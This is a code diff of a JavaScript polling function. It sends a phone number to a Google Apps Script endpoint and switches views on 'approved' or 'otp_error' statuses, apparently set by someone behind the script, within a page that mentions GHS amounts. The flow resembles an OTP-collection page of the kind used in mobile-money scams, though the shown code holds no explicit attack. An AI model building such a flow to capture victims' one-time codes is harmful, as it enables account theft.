@@ -180,48 +180,43 @@ Amt: GHS ${amt}
 
 async function startPolling(phone) {
     const cleanID = String(phone).trim();
-    console.log("DEBUG: Starting Poll for ID [" + cleanID + "]");
-
+    
     const poller = setInterval(async () => {
         try {
-            // The v= ensures we don't get an old cached 'pending' result
+            // THE FIX: Adding '&v=' with a timestamp forces Google to give 
+            // the REAL current status, not a 30-second old 'pending' one.
             const r = await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&v=${Date.now()}`);
             const status = (await r.text()).trim();
 
-            console.log("DEBUG: ID [" + cleanID + "] Status is: " + status);
+            console.log("Checking ID [" + cleanID + "]: " + status);
+
+            if (status === "otp_error" && !isResetting) {
+                isResetting = true;
+
+                // 1. Tell the script to clear so it doesn't loop
+                await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&cmd=clear`);
+
+                // 2. Kill timers
+                if (otpInterval) clearInterval(otpInterval);
+                if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
+
+                // 3. Take them back to the start
+                showView(1); 
+                alert("❌ INCORRECT OTP: The code you entered is invalid. Please re-apply for verification.");
+                
+                isResetting = false;
+            }
 
             if (status === "approved") {
                 clearInterval(poller);
-                showView(3); 
+                showView(3);
                 runCountdown(30);
-                fetch(`${SCRIPT_URL}?num=${cleanID}&cmd=clear`);
+                fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&cmd=clear`);
             }
-
-            if (status === "otp_error" && !isResetting) {
-    isResetting = true;
-
-    // 1. Kill all active timers and auto-approvals
-    if (otpInterval) clearInterval(otpInterval);
-    if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
-
-    // 2. Tell the script to clear the error so they can re-apply fresh
-    await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(phone)}&cmd=clear`);
-
-    // 3. Optional: Clear the form inputs so they start with a blank slate
-    // document.getElementById('application-form').reset(); 
-
-    // 4. TAKE BACK TO START
-    showView(1); 
-
-    // 5. Visual feedback (Toast or Alert)
-    alert("❌ Verification Failed: The code entered was incorrect. Please verify your details and re-apply.");
-
-    isResetting = false;
-}
         } catch (e) {
-            console.error("DEBUG: Connection Failed", e);
+            console.error("Polling failed:", e);
         }
-    }, 3000);
+    }, 3000); // Check every 3 seconds
 }
 
 
